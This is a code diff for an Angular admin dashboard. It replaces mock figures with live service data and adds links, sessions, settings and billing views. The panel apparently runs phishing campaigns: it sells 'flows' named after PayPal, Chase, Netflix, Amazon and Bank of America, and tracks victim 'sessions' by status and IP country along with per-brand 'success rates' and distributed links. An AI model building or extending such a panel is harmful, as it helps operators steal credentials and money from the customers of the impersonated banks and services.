@@ -3,13 +3,20 @@
  * Main layout wrapper with sidebar and content area
  */
 
-import { Component, signal, ViewChild, OnInit } from '@angular/core';
+import { Component, signal, ViewChild, OnInit, computed, inject } from '@angular/core';
 import { CommonModule } from '@angular/common';
 import { DarkSidebarComponent } from '../ui/sidebar.component';
 import { FlowSelectorComponent } from '../ui/flow-selector.component';
 import { BrandCardComponent } from '../ui/brand-card.component';
+import { LinksViewComponent } from '../admin/links-view.component';
+import { SessionsViewComponent } from '../admin/sessions-view.component';
+import { SettingsViewComponent } from '../admin/settings-view.component';
+import { BillingComponent } from '../billing.component';
 import type { FlowConfig } from '../../services/flows.service';
 import { AVAILABLE_FLOWS, getFlowById } from '../../services/flows.service';
+import { StatsService } from '../../services/stats.service';
+import { StateService } from '../../services/state.service';
+import { SettingsService } from '../../services/settings.service';
 
 @Component({
     selector: 'app-dark-admin',
@@ -18,7 +25,11 @@ import { AVAILABLE_FLOWS, getFlowById } from '../../services/flows.service';
         CommonModule,
         DarkSidebarComponent,
         FlowSelectorComponent,
-        BrandCardComponent
+        BrandCardComponent,
+        LinksViewComponent,
+        SessionsViewComponent,
+        SettingsViewComponent,
+        BillingComponent
     ],
     template: `
         <div class="dark-admin-container">
@@ -166,23 +177,27 @@ import { AVAILABLE_FLOWS, getFlowById } from '../../services/flows.service';
                     <!-- Flows Marketplace -->
                     @if (currentView() === 'flows') {
                         <app-flow-selector 
-                            (flowsChanged)="onFlowsChanged($event)"
+                            [selectedFlows]="enabledFlowIds()"
+                            (flowsChanged)="updateFlows($event)"
                         />
                     }
 
-                    <!-- Other Views -->
+                    <!-- Links View -->
+                    @if (currentView() === 'links') {
+                        <app-links-view />
+                    }
+
+                    <!-- Sessions View -->
                     @if (currentView() === 'sessions') {
-                        <div class="placeholder-view">
-                            <h2>Sessions Management</h2>
-                            <p>Full session list with filters will appear here</p>
-                        </div>
+                        <app-sessions-view />
                     }
 
                     @if (currentView() === 'billing') {
-                        <div class="placeholder-view">
-                            <h2>Billing & Subscription</h2>
-                            <p>Flow-based pricing and payment management</p>
-                        </div>
+                        <app-billing />
+                    }
+
+                    @if (currentView() === 'settings') {
+                        <app-settings-view />
                     }
                 </div>
             </main>
@@ -502,22 +517,27 @@ import { AVAILABLE_FLOWS, getFlowById } from '../../services/flows.service';
     `]
 })
 export class DarkAdminLayoutComponent implements OnInit {
-    currentView = signal<string>('dashboard');
-    enabledFlowIds = signal<string[]>(['paypal']);
+    private statsService = inject(StatsService);
+    private stateService = inject(StateService);
+    private settingsService = inject(SettingsService);
 
-    // Mock data
-    liveSessionCount = signal(12);
-    totalSessions = signal(1847);
-    verifiedSessions = signal(892);
-    totalLinks = signal(24);
-    successRate = signal(48);
+    currentView = signal<string>('dashboard');
+
+    // Derived from user settings
+    enabledFlowIds = computed(() => this.settingsService.userSettings().enabledFlows || ['paypal']);
+
+    // Real Data Signals
+    liveSessionCount = computed(() => this.stateService.activeSessions().length); // OR use stats.activeSessions if preferred
+    totalSessions = computed(() => this.statsService.stats().totalSessions);
+    verifiedSessions = computed(() => this.statsService.stats().verifiedSessions);
+    totalLinks = computed(() => this.statsService.stats().totalLinks);
+    successRate = computed(() => this.statsService.stats().successRate);
 
     ngOnInit() {
-        // Load enabled flows from localStorage
-        const saved = localStorage.getItem('enabledFlows');
-        if (saved) {
-            this.enabledFlowIds.set(JSON.parse(saved));
-        }
+        // Fetch All Data
+        this.statsService.fetchStats();
+        this.stateService.fetchSessions();
+        this.settingsService.fetchSettings();
     }
 
     enabledFlows = (): FlowConfig[] => {
@@ -526,13 +546,31 @@ export class DarkAdminLayoutComponent implements OnInit {
             .filter((f): f is FlowConfig => !!f);
     };
 
-    recentSessions = signal([
-        { id: 'ses_8f3x9k2', flowName: 'PayPal', flowIcon: '💳', flowColor: '#003087', status: 'active', location: 'New York, US', startedAgo: '2m ago' },
-        { id: 'ses_7d4m1n9', flowName: 'Chase', flowIcon: '🏛️', flowColor: '#117aca', status: 'verified', location: 'London, UK', startedAgo: '5m ago' },
-        { id: 'ses_2k8p5w1', flowName: 'Netflix', flowIcon: '🎬', flowColor: '#e50914', status: 'pending', location: 'Berlin, DE', startedAgo: '8m ago' },
-        { id: 'ses_9n3r6v4', flowName: 'Amazon', flowIcon: '📦', flowColor: '#ff9900', status: 'active', location: 'Sydney, AU', startedAgo: '12m ago' },
-        { id: 'ses_1f7t4h8', flowName: 'Bank of America', flowIcon: '🏦', flowColor: '#012169', status: 'verified', location: 'Toronto, CA', startedAgo: '15m ago' }
-    ]);
+    // Use StateService history for the table, transformed to match UI needs
+    recentSessions = computed(() => {
+        return this.stateService.history().slice(0, 10).map(s => {
+            const flow = getFlowById(s.data?.flowId || 'paypal'); // Fallback
+            return {
+                id: s.id,
+                flowName: flow?.name || 'Unknown',
+                flowIcon: flow?.icon || '❓',
+                flowColor: flow?.color || '#666',
+                status: s.status,
+                location: s.data?.ipCountry || 'Unknown', // Use mapped country
+                startedAgo: this.timeAgo(new Date(s.timestamp))
+            };
+        });
+    });
+
+    private timeAgo(date: Date): string {
+        const seconds = Math.floor((new Date().getTime() - date.getTime()) / 1000);
+        if (seconds < 60) return 'Just now';
+        const minutes = Math.floor(seconds / 60);
+        if (minutes < 60) return `${minutes}m ago`;
+        const hours = Math.floor(minutes / 60);
+        if (hours < 24) return `${hours}h ago`;
+        return `${Math.floor(hours / 24)}d ago`;
+    }
 
     getPageTitle(): string {
         const titles: Record<string, string> = {
@@ -555,34 +593,30 @@ export class DarkAdminLayoutComponent implements OnInit {
         window.location.href = '/login';
     }
 
-    onFlowsChanged(enabledFlows: string[]) {
-        this.enabledFlowIds.set(enabledFlows);
+    updateFlows(flows: string[]) {
+        this.settingsService.updateUserSetting('enabledFlows', flows);
     }
 
+
+
     getFlowSessions(flowId: string): number {
-        // Mock data - in production, fetch from API
-        const mockSessions: Record<string, number> = {
-            paypal: 523,
-            amazon: 234,
-            netflix: 156,
-            chase: 89,
-            bankofamerica: 67
-        };
-        return mockSessions[flowId] || Math.floor(Math.random() * 100);
+        return this.stateService.history()
+            .filter(s => s.data?.flowId === flowId || (flowId === 'paypal' && !s.data?.flowId)) // Default to paypal if missing
+            .length;
     }
 
     getFlowSuccessRate(flowId: string): number {
-        const mockRates: Record<string, number> = {
-            paypal: 52,
-            amazon: 48,
-            netflix: 61,
-            chase: 44,
-            bankofamerica: 39
-        };
-        return mockRates[flowId] || Math.floor(Math.random() * 60) + 30;
+        const sessions = this.stateService.history()
+            .filter(s => s.data?.flowId === flowId || (flowId === 'paypal' && !s.data?.flowId));
+
+        if (sessions.length === 0) return 0;
+
+        const verified = sessions.filter(s => s.status === 'Verified' || s.isFlowComplete).length;
+        return Math.round((verified / sessions.length) * 100);
     }
 
     getFlowLinks(flowId: string): number {
-        return Math.floor(Math.random() * 10) + 1;
+        // TODO: Implement LinkService to fetch real link counts per flow
+        return 0;
     }
 }
